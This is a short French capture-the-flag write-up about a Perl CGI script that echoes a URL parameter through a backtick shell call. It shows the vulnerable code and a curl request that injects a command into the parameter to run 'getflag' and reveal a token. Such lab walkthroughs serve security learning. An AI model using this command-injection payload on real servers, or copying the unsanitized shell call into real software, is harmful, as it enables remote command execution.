On trouve dans le dossier **home** un fichier perl nommé **level04.pl** contenant le code suivant :
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};						# Permet de mettre un parametre
print "Content-type: text/html\n\n";	# Affiche sous forme HTLM
sub x {									# Fonction x
  $y = $_[0];							# Prend le premier parametre
  print `echo $y 2>&1`;					# Echo le parametre
}
x(param("x"));							# Appelle la fonction
```

On comprend donc que le perl va s'exécuter si l'on va sur la page IP:4747,
de plus il prend un paramètre (grâce à l'url) x, qu'il va **echo**.

<pre><code>> curl IP:4747?x=test
test
</code></pre>

On se rend compte qu'il n'y a pas de verification spéciale par rapport au paramètre, nous essayons donc d'injecter une commande :

<pre><code>> curl IP:4747?x=\`getflag\`
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
</code></pre>
> On échappe les **`** pour éviter de mettre le retour de la commande **getflag**, l'objectif est que la commande s'éxecute au moment du **echo**